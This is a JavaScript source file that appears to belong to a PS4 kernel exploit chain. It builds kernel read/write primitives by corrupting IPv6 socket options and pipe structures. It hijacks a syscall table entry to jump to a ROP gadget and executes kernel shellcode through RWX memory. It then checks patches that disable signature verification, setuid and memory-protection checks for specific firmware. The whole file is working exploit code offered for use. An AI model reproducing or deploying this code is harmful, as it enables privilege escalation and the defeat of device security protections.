// PS4 Kernel Read/Write primitives
// Ported from PS5 version - adjusted for PS4 structure offsets

kernel = {
    addr: {},
    copyout: null,
    copyin: null,
    read_buffer: null,
    write_buffer: null
};

kernel.read_byte = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

kernel.read_word = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

kernel.read_dword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_qword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_null_terminated_string = function(kaddr) {
    let result = "";

    while (true) {
        const chunk = kernel.read_buffer(kaddr, 0x8);
        if (!chunk || chunk.length === 0) break;

        let null_pos = -1;
        for (let i = 0; i < chunk.length; i++) {
            if (chunk[i] === 0) {
                null_pos = i;
                break;
            }
        }

        if (null_pos >= 0) {
            if (null_pos > 0) {
                for(let i = 0; i < null_pos; i++) {
                    result += String.fromCharCode(Number(chunk[i]));
                }
            }
            return result;
        }

        for(let i = 0; i < chunk.length; i++) {
            result += String.fromCharCode(Number(chunk[i]));
        }

        kaddr = kaddr + BigInt(chunk.length);
    }

    return result;
};

kernel.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

kernel.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

// IPv6 kernel r/w primitive
ipv6_kernel_rw = {
    data: {},
    ofiles: null,
    kread8: null,
    kwrite8: null
};

ipv6_kernel_rw.init = function(ofiles, kread8, kwrite8) {
    ipv6_kernel_rw.ofiles = ofiles;
    ipv6_kernel_rw.kread8 = kread8;
    ipv6_kernel_rw.kwrite8 = kwrite8;

    ipv6_kernel_rw.create_pipe_pair();
    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
};

ipv6_kernel_rw.get_fd_data_addr = function(fd) {
    // PS4: ofiles is at offset 0x0, each entry is 0x8 bytes
    const filedescent_addr = ipv6_kernel_rw.ofiles + BigInt(fd) * kernel_offset.SIZEOF_OFILES;
    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0n);
    return ipv6_kernel_rw.kread8(file_addr + 0x0n);
};

ipv6_kernel_rw.create_pipe_pair = function() {
    const [read_fd, write_fd] = create_pipe();

    ipv6_kernel_rw.data.pipe_read_fd = read_fd;
    ipv6_kernel_rw.data.pipe_write_fd = write_fd;
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd);
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);
};

ipv6_kernel_rw.create_overlapped_ipv6_sockets = function() {
    const master_target_buffer = malloc(0x14);
    const slave_buffer = malloc(0x14);
    const pktinfo_size_store = malloc(0x8);

    write64_uncompressed(pktinfo_size_store, 0x14n);

    const master_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    const victim_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

    syscall(SYSCALL.setsockopt, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14n);
    syscall(SYSCALL.setsockopt, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14n);

    const master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock);
    const master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB);
    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS);

    const slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock);
    const slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB);
    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS);

    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10n, slave_pktopts + 0x10n);

    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer;
    ipv6_kernel_rw.data.slave_buffer = slave_buffer;
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store;
    ipv6_kernel_rw.data.master_sock = master_sock;
    ipv6_kernel_rw.data.victim_sock = victim_sock;
};

ipv6_kernel_rw.ipv6_write_to_victim = function(kaddr) {
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x10n, 0n);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14n);
};

ipv6_kernel_rw.ipv6_kread = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.getsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store);
};

ipv6_kernel_rw.ipv6_kwrite = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, buffer_addr, 0x14n);
};

ipv6_kernel_rw.ipv6_kread8 = function(kaddr) {
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer);
    return read64_uncompressed(ipv6_kernel_rw.data.slave_buffer);
};

ipv6_kernel_rw.copyout = function(kaddr, uaddr, len) {
    if (kaddr === null || kaddr === undefined ||
        uaddr === null || uaddr === undefined ||
        len === null || len === undefined || len === 0n) {
        throw new Error("copyout: invalid arguments");
    }

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0x4000000040000000n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);

    syscall(SYSCALL.read, ipv6_kernel_rw.data.pipe_read_fd, uaddr, len);
};

ipv6_kernel_rw.copyin = function(uaddr, kaddr, len) {
    if (kaddr === null || kaddr === undefined ||
        uaddr === null || uaddr === undefined ||
        len === null || len === undefined || len === 0n) {
        throw new Error("copyin: invalid arguments");
    }

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);

    syscall(SYSCALL.write, ipv6_kernel_rw.data.pipe_write_fd, uaddr, len);
};

ipv6_kernel_rw.read_buffer = function(kaddr, len) {
    let mem = ipv6_kernel_rw.data.read_mem;
    if (len > PAGE_SIZE) {
        mem = malloc(len);
    }

    ipv6_kernel_rw.copyout(kaddr, mem, BigInt(len));
    return read_buffer(mem, len);
};

ipv6_kernel_rw.write_buffer = function(kaddr, buf) {
    const temp_addr = malloc(buf.length);
    write_buffer(temp_addr, buf);
    ipv6_kernel_rw.copyin(temp_addr, kaddr, BigInt(buf.length));
};

// Helper functions
function is_kernel_rw_available() {
    return kernel.read_buffer && kernel.write_buffer;
}

function check_kernel_rw() {
    if (!is_kernel_rw_available()) {
        throw new Error("kernel r/w is not available");
    }
}

function find_proc_by_name(name) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }

    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM);
        if (proc_name === name) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }

    return null;
}

function find_proc_by_pid(pid) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }

    const target_pid = BigInt(pid);
    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID);
        if (proc_pid === target_pid) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }

    return null;
}

// Apply kernel patches via kexec using a single ROP chain
// This avoids returning to JS between critical operations
function apply_kernel_patches(fw_version) {
    try {
        // Get shellcode for this firmware
        const shellcode = get_kpatch_shellcode(fw_version);
        if (!shellcode) {
            logger.log("No kernel patch shellcode for FW " + fw_version);
            return false;
        }

        logger.log("Kernel patch shellcode: " + shellcode.length + " bytes");

        // Constants
        const PROT_READ = 0x1n;
        const PROT_WRITE = 0x2n;
        const PROT_EXEC = 0x4n;
        const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;

        const mapping_addr = 0x926100000n;  // Different from 0x920100000 to avoid conflicts
        const aligned_memsz = 0x10000n;

        // Get sysent[661] address and save original values
        const sysent_661_addr = kernel.addr.base + kernel_offset.SYSENT_661;
        logger.log("sysent[661] @ " + hex(sysent_661_addr));

        const sy_narg = kernel.read_dword(sysent_661_addr);
        const sy_call = kernel.read_qword(sysent_661_addr + 8n);
        const sy_thrcnt = kernel.read_dword(sysent_661_addr + 0x2Cn);

        logger.log("Original sy_narg: " + sy_narg);
        logger.log("Original sy_call: " + hex(sy_call));
        logger.log("Original sy_thrcnt: " + sy_thrcnt);

        // Calculate jmp rsi gadget address
        const jmp_rsi_gadget = kernel.addr.base + kernel_offset.JMP_RSI_GADGET;
        logger.log("jmp rsi gadget @ " + hex(jmp_rsi_gadget));

        // Allocate buffer for shellcode in userspace first
        const shellcode_buf = malloc(shellcode.length + 0x100);
        logger.log("Shellcode buffer @ " + hex(shellcode_buf));

        // Copy shellcode to userspace buffer
        for (let i = 0; i < shellcode.length; i++) {
            write8_uncompressed(shellcode_buf + BigInt(i), shellcode[i]);
        }

        // Verify first bytes
        const first_bytes = read32_uncompressed(shellcode_buf);
        logger.log("First bytes @ shellcode: " + hex(first_bytes));

        // Hijack sysent[661] to point to jmp rsi gadget
        logger.log("Hijacking sysent[661]...");
        kernel.write_dword(sysent_661_addr, 2n);           // sy_narg = 2
        kernel.write_qword(sysent_661_addr + 8n, jmp_rsi_gadget);  // sy_call = jmp rsi
        kernel.write_dword(sysent_661_addr + 0x2Cn, 1n);   // sy_thrcnt = 1
        logger.log("Hijacked sysent[661]");
        logger.flush();

        // Check if jitshm_create has a dedicated gadget
        const jitshm_num = Number(SYSCALL.jitshm_create);
        const jitshm_gadget = syscall_gadget_table[jitshm_num];
        logger.log("jitshm_create gadget: " + (jitshm_gadget ? hex(jitshm_gadget) : "NOT FOUND"));
        logger.flush();

        // Try using the standard syscall() function if gadget exists
        if (!jitshm_gadget) {
            logger.log("ERROR: jitshm_create gadget not found in libkernel");
            logger.log("Kernel patches require jitshm_create syscall support");
            return false;
        }

        // 1. jitshm_create(0, aligned_memsz, PROT_RWX)
        logger.log("Calling jitshm_create...");
        logger.flush();
        const exec_handle = syscall(SYSCALL.jitshm_create, 0n, aligned_memsz, PROT_RWX);
        logger.log("jitshm_create handle: " + hex(exec_handle));

        if (exec_handle >= 0xffff800000000000n) {
            logger.log("ERROR: jitshm_create failed");
            kernel.write_dword(sysent_661_addr, sy_narg);
            kernel.write_qword(sysent_661_addr + 8n, sy_call);
            kernel.write_dword(sysent_661_addr + 0x2Cn, sy_thrcnt);
            return false;
        }

        // 2. mmap(mapping_addr, aligned_memsz, PROT_RWX, MAP_SHARED|MAP_FIXED, exec_handle, 0)
        logger.log("Calling mmap...");
        logger.flush();
        const mmap_result = syscall(SYSCALL.mmap, mapping_addr, aligned_memsz, PROT_RWX, 0x11n, exec_handle, 0n);
        logger.log("mmap result: " + hex(mmap_result));

        if (mmap_result >= 0xffff800000000000n) {
            logger.log("ERROR: mmap failed");
            kernel.write_dword(sysent_661_addr, sy_narg);
            kernel.write_qword(sysent_661_addr + 8n, sy_call);
            kernel.write_dword(sysent_661_addr + 0x2Cn, sy_thrcnt);
            return false;
        }

        // 3. Copy shellcode to mapped memory
        logger.log("Copying shellcode to " + hex(mapping_addr) + "...");
        for (let j = 0; j < shellcode.length; j++) {
            write8_uncompressed(mapping_addr + BigInt(j), shellcode[j]);
        }

        // Verify
        const verify_bytes = read32_uncompressed(mapping_addr);
        logger.log("First bytes @ mapped: " + hex(verify_bytes));
        logger.flush();

        // 4. kexec(mapping_addr) - syscall 661, hijacked to jmp rsi
        logger.log("Calling kexec...");
        logger.flush();
        const kexec_result = syscall(SYSCALL.kexec, mapping_addr);
        logger.log("kexec returned: " + hex(kexec_result));

        // === Verify 12.00 kernel patches ===
        if (fw_version === "12.00" || fw_version === "12.02") {
            logger.log("Verifying 12.00 kernel patches...");
            let patch_errors = 0;

            // Patch offsets and expected values for 12.00
            const patches_to_verify = [
                { off: 0x1b76a3n, exp: 0x04eb, name: "dlsym_check1", size: 2 },
                { off: 0x1b76b3n, exp: 0x04eb, name: "dlsym_check2", size: 2 },
                { off: 0x1b76d3n, exp: 0xe990, name: "dlsym_check3", size: 2 },
                { off: 0x627af4n, exp: 0x00eb, name: "veriPatch", size: 2 },
                { off: 0xacdn, exp: 0xeb, name: "bcopy", size: 1 },
                { off: 0x2bd3cdn, exp: 0xeb, name: "bzero", size: 1 },
                { off: 0x2bd411n, exp: 0xeb, name: "pagezero", size: 1 },
                { off: 0x2bd48dn, exp: 0xeb, name: "memcpy", size: 1 },
                { off: 0x2bd4d1n, exp: 0xeb, name: "pagecopy", size: 1 },
                { off: 0x2bd67dn, exp: 0xeb, name: "copyin", size: 1 },
                { off: 0x2bdb2dn, exp: 0xeb, name: "copyinstr", size: 1 },
                { off: 0x2bdbfdn, exp: 0xeb, name: "copystr", size: 1 },
                { off: 0x6283dfn, exp: 0x00eb, name: "sysVeri_suspend", size: 2 },
                { off: 0x490n, exp: 0x00, name: "syscall_check", size: 4 },
                { off: 0x4c2n, exp: 0xeb, name: "syscall_jmp1", size: 1 },
                { off: 0x4b9n, exp: 0x00eb, name: "syscall_jmp2", size: 2 },
                { off: 0x4b5n, exp: 0x00eb, name: "syscall_jmp3", size: 2 },
                { off: 0x3914e6n, exp: 0xeb, name: "setuid", size: 1 },
                { off: 0x2fc0ecn, exp: 0x04eb, name: "vm_map_protect", size: 2 },
                { off: 0x1b7164n, exp: 0xe990, name: "dynlib_load_prx", size: 2 },
                { off: 0x1fa71an, exp: 0x37, name: "mmap_rwx1", size: 1 },
                { off: 0x1fa71dn, exp: 0x37, name: "mmap_rwx2", size: 1 },
                { off: 0x1102d80n, exp: 0x02, name: "sysent11_narg", size: 4 },
                { off: 0x1102dacn, exp: 0x01, name: "sysent11_thrcnt", size: 4 },
            ];

            for (const p of patches_to_verify) {
                let actual;
                if (p.size === 1) {
                    actual = Number(kernel.read_byte(kernel.addr.base + p.off));
                } else if (p.size === 2) {
                    actual = Number(kernel.read_word(kernel.addr.base + p.off));
                } else {
                    actual = Number(kernel.read_dword(kernel.addr.base + p.off));
                }

                if (actual === p.exp) {
                    logger.log("  [OK] " + p.name);
                } else {
                    logger.log("  [FAIL] " + p.name + ": expected " + hex(p.exp) + ", got " + hex(actual));
                    patch_errors++;
                }
            }

            // Special check for sysent[11] sy_call - should point to jmp [rsi] gadget
            const sysent11_call = kernel.read_qword(kernel.addr.base + 0x1102d88n);
            const expected_gadget = kernel.addr.base + 0x47b31n;
            if (sysent11_call === expected_gadget) {
                logger.log("  [OK] sysent11_call -> jmp_rsi @ " + hex(sysent11_call));
            } else {
                logger.log("  [FAIL] sysent11_call: expected " + hex(expected_gadget) + ", got " + hex(sysent11_call));
                patch_errors++;
            }

            if (patch_errors === 0) {
                logger.log("All 12.00 kernel patches verified OK!");
            } else {
                logger.log("[WARNING] " + patch_errors + " kernel patches failed!");
            }
            logger.flush();
        }

        // Restore original sysent[661]
        logger.log("Restoring sysent[661]...");
        kernel.write_dword(sysent_661_addr, sy_narg);
        kernel.write_qword(sysent_661_addr + 8n, sy_call);
        kernel.write_dword(sysent_661_addr + 0x2Cn, sy_thrcnt);
        logger.log("Restored sysent[661]");

        logger.log("Kernel patches applied!");
        logger.flush();
        return true;

    } catch (e) {
        logger.log("apply_kernel_patches error: " + e.message);
        logger.log(e.stack);
        return false;
    }
}
